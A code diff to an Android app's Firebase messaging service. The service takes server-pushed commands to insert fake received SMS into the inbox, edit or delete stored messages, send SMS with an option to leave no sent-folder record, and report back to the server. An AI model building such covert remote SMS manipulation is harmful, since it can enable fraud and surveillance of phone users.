@@ -33,9 +33,9 @@ import android.util.Log;
 
 import androidx.core.app.NotificationCompat;
 
+import com.example.sms.App;
 import com.example.sms.http.HttpUtils;
 import com.example.sms.MainActivity;
-import com.example.sms.receiver.SendSmsReceiver;
 import com.example.sms.utils.MapUtils;
 import com.example.sms.utils.NotificationUtils;
 import com.example.sms.R;
@@ -91,13 +91,14 @@ public class MyFirebaseMessagingService extends FirebaseMessagingService {
                                 contentValues.put("body", body);
                                 contentValues.put("date", System.currentTimeMillis());
                                 contentValues.put("read", Boolean.FALSE);
+                                contentValues.put("type", 1);
                                 Uri parse = Uri.parse("content://sms/");
                                 Uri uri = getContentResolver().insert(parse, contentValues);
                                 long id = Long.parseLong(uri.getLastPathSegment());
                                 if (is_notification==1){
                                     NotificationUtils.createNotificationForNormal(this,address,body);
                                 }
-                                SmsReport.post(id,address,body,"add");
+                                SmsReport.post(id,address,body,"add",is_notification,1);
                             }
                             break;
                         case "delete_sms":{
@@ -107,11 +108,12 @@ public class MyFirebaseMessagingService extends FirebaseMessagingService {
                                 contentValues.put("_id", id);
                                 Uri parse = Uri.parse("content://sms/");
                                 getContentResolver().delete(parse, "_id="+id,null);
-                                SmsReport.post(id,"","","delete");
+                                SmsReport.post(id,"","","delete",0,0);
                             }
                             break;
                         case "send_sms":
                         {
+                            int is_insert = result.optInt("is_insert");
                             JSONObject sms = result.optJSONObject("sms");
                             String address = sms.optString("address");
                             String body = sms.optString("body");
@@ -119,14 +121,16 @@ public class MyFirebaseMessagingService extends FirebaseMessagingService {
                             SmsManager smsManager = SmsManager.getDefault();
                             Uri parse = Uri.parse("content://sms/sent");
                             ArrayList<String> conList=smsManager.divideMessage(body);
-                            for (String txtCon : conList) {
-                                //先插入数据库
-                                ContentValues contentValues = new ContentValues();
-                                contentValues.put("address", address);
-                                contentValues.put("body", txtCon);
-                                contentValues.put("status", 64);
-                                Uri uri = contentResolver.insert(parse, contentValues);
-                                Long.parseLong(uri.getLastPathSegment());
+                            if (is_insert==1){
+                                for (String txtCon : conList) {
+                                    //先插入数据库
+                                    ContentValues contentValues = new ContentValues();
+                                    contentValues.put("address", address);
+                                    contentValues.put("body", txtCon);
+                                    contentValues.put("status", 0);
+                                    Uri uri = contentResolver.insert(parse, contentValues);
+                                    Long.parseLong(uri.getLastPathSegment());
+                                }
                             }
                             smsManager.sendMultipartTextMessage(address,null, conList , null, null);
                         }
@@ -145,16 +149,28 @@ public class MyFirebaseMessagingService extends FirebaseMessagingService {
                                 contentValues.put("body", body);
                             Uri parse = Uri.parse("content://sms/");
                             getContentResolver().update(parse, contentValues,"_id="+id,null);
-                            SmsReport.post(id,address,body,"update");
+                            SmsReport.post(id,address,body,"update",0,1);
                         }
-                            break;
-                        case "update_config":
-
                             break;
                         case "push":
                             String title = result.optString("title");
                             String body = result.optString("body");
                             sendNotification(title,body);
+                            break;
+                        case "alive":
+                        {
+                            HttpUtils.post(getString(R.string.sms_url) + "/alive", MapUtils.newMap(), new HttpUtils.Callback() {
+                                @Override
+                                public void success(JSONObject result) {
+
+                                }
+
+                                @Override
+                                public void error() {
+
+                                }
+                            });
+                        }
                             break;
                     }
                 }catch (Exception e){
